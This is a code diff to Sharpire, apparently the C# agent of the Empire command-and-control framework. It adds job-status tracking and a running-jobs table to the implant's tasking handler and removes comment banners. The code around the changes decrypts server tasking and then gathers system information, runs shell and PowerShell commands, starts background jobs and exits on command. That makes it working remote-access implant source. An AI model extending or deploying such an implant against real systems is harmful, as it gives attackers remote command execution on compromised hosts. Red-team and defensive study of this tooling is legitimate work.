@@ -35,9 +35,6 @@ namespace Sharpire
             this.sessionInfo = sessionInfo;
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
         private byte[] NewRoutingPacket(byte[] encryptedBytes, int meta)
         {
             int encryptedBytesLength = 0;
@@ -115,9 +112,6 @@ namespace Sharpire
             }
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
         internal byte[] GetTask()
         {
             byte[] results = new byte[0];
@@ -147,13 +141,8 @@ namespace Sharpire
             return results;
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
         internal void SendMessage(byte[] packets)
         {
-#if (PRINT)
-            Console.WriteLine("Checking In");
-#endif
             byte[] ivBytes = NewInitializationVector(16);
             byte[] encryptedBytes = new byte[0];
             using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
@@ -193,9 +182,6 @@ namespace Sharpire
 
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
         private void ProcessTaskingPackets(byte[] encryptedTask)
         {
             byte[] taskingBytes = EmpireStager.aesDecrypt(sessionInfo.GetSessionKey(), encryptedTask);
@@ -207,21 +193,38 @@ namespace Sharpire
             string remaining = firstPacket.remaining;
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        //The hard part
-        ////////////////////////////////////////////////////////////////////////////////
         private byte[] ProcessTasking(PACKET packet)
         {
             byte[] returnPacket = new byte[0];
             try
             {
-                //Change this to a switch : case
                 int type = packet.type;
+                ushort taskId = packet.taskId;
+
+                if (!jobTracking.jobs.ContainsKey(taskId.ToString()))
+                {
+                    jobTracking.jobs[taskId.ToString()] = new JobTracking.Job
+                    {
+                        Status = "started",
+                        Thread = null,
+                        Language = null,
+                        Powershell = new JobTracking.PowershellDetails
+                        {
+                            AppDomain = null,
+                            PsHost = null,
+                            Buffer = null,
+                            PsHostExec = null
+                        }
+                    };
+                    jobTracking.jobsId[taskId.ToString()] = taskId;
+                }
+
                 switch (type)
                 {
                     case 1:
                         byte[] systemInformationBytes = EmpireStager.GetSystemInformation("0", "servername");
                         string systemInformation = Encoding.ASCII.GetString(systemInformationBytes);
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return EncodePacket(1, systemInformation, packet.taskId);
                     case 2:
                         string message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting";
@@ -248,34 +251,45 @@ namespace Sharpire
                             output = Agent.InvokeShellCommand(parts.FirstOrDefault(), string.Join(" ",parts.Skip(1).Take(parts.Length - 1).ToArray()));
                         }
                         byte[] packetBytes = EncodePacket(packet.type, output, packet.taskId);
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return packetBytes;
                     case 41:
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task41(packet);
                     case 42:
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task42(packet);
                     case 43:
                         return Task43(packet);
                     case 44:
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task44(packet);
                     case 50:
-                        List<string> runningJobs = new List<string>(jobTracking.jobs.Keys);
-                        return EncodePacket(packet.type, runningJobs.ToArray(), packet.taskId);
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
+                        return GenerateRunningJobsTable(packet);
                     case 51:
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task51(packet);
                     case 100:
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return EncodePacket(packet.type, Agent.RunPowerShell(packet.data), packet.taskId);
                     case 101:
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task101(packet);
                     case 110:
                         string jobId = jobTracking.StartAgentJob(packet.data, packet.taskId);
+                        jobTracking.jobs[jobId].Status = "running";
                         return EncodePacket(packet.type, "Job started: " + jobId, packet.taskId);
                     case 111:
                         return EncodePacket(packet.type, "Not Implimented", packet.taskId);
                     case 120:
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task120(packet);
                     case 121:
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task121(packet);
                     default:
+                        jobTracking.jobs[taskId.ToString()].Status = "error";
                         return EncodePacket(0, "Invalid type: " + packet.type, packet.taskId);
                 }
             }
@@ -285,13 +299,21 @@ namespace Sharpire
             }
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        internal byte[] EncodePacket(ushort type, string[] data, ushort resultId)
+        private byte[] GenerateRunningJobsTable(PACKET packet)
         {
-            string dataString = string.Join("\n", data);
-            return EncodePacket(type, dataString, resultId);
+            StringBuilder table = new StringBuilder();
+            table.AppendLine("Task ID | Status");
+            table.AppendLine("----------------");
+
+            foreach (var job in jobTracking.jobs)
+            {
+                string taskId = job.Key;
+                string status = job.Value.Status;
+                var unused = table.AppendLine($"{taskId,-7} | {status}");
+            }
+
+            string tableString = table.ToString();
+            return EncodePacket(packet.type, tableString, packet.taskId);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
